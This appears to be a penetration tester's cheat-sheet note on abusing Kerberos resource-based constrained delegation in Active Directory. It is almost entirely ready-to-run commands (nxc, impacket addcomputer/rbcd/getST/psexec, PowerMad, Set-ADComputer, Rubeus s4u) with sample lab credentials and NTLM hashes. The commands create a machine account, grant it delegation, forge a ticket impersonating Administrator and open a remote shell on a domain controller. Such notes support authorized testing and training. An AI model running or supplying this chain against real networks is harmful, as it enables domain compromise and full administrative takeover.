---
tags:
  - Authenticated
  - Elevated
  - Kerberos
  - msDS-AllowedToActOnBehalfOfOtherIdentity
  - AD
---
## Linux
---

### With nxc
impersonate administrator given `msDS-AllowedToActOnBehalfOfOtherIdentity` is set on account we control
```bash
nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator
```
### With impacket
Add computer you control
```PowerShell
impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Megaman!1' -dc-ip 192.168.0.100 its-piemonte.local/tantani:'AAAAaaaa!1'
```
example with hash
```PowerShell
impacket-addcomputer -computer-name 'rbcd$' -computer-pass 'Password123!' -dc-ip 192.168.146.175 resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808
```
Configure delegation rights
```PowerShell
impacket-rbcd -delegate-to 'its-dc1$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write its-piemonte/tantani:'AAAAaaaa!1'
```
Example with hash
```PowerShell
impacket-rbcd -delegate-to 'RESOURCEDC$' -delegate-from 'rbcd$' -dc-ip 192.168.146.175 -action write resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808
```
Request ticket for admin
```PowerShell
impacket-getST -spn cifs/its-dc1.its-piemonte.local -impersonate Administrator -dc-ip 192.168.0.100 its-piemonte.local/rbcd-test:'Megaman!1'
```
another example
```PowerShell
impacket-getST -spn cifs/RESOURCEDC.resourced.local -impersonate Administrator -dc-ip 192.168.146.175 resourced.local/rbcd:'Password123!'
```
auth with ccache
```PowerShell
export KRB5CCNAME=Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache
```
PSEXEC IN
```PowerShell
impacket-psexec Administrator@resourced.local -k -no-pass -dc-ip 192.168.146.175
```
## Windows
---
Windows [PowerMad](https://github.com/Kevin-Robertson/Powermad) has a cmdlet to let us create machine accounts:
```PowerShell
New-MachineAccount -MachineAccount baud -Password $(ConvertTo-SecureString 'Baudy16!1' -AsPlainText -Force)
```
Configure rights (with default AD powershell module)
```PowerShell
Set-ADComputer its-dc1 -PrincipalsAllowedToDelegateToAccount baud$
```
use rubeus
```PowerShell
# get AES:
Rubeus.exe hash /password:Baudy16!1 /user:baud$ /domain:its-piemonte.local
# get only RC4:
Rubeus.exe hash /password:Baudy16!1
```
  
```PowerShell
Rubeus.exe s4u /user:baud$ /rc4:8F8172E42D04C1934FECC9E8404E2657 /domain:its-piemonte.local /msdsspn:cifs/its-dc1 /impersonateuser:administrator /ptt
```
  
Convert to auth ticket
```PowerShell
impacket-ticketConverter rubeusTicket.kirbi impacketTicket.ccache
```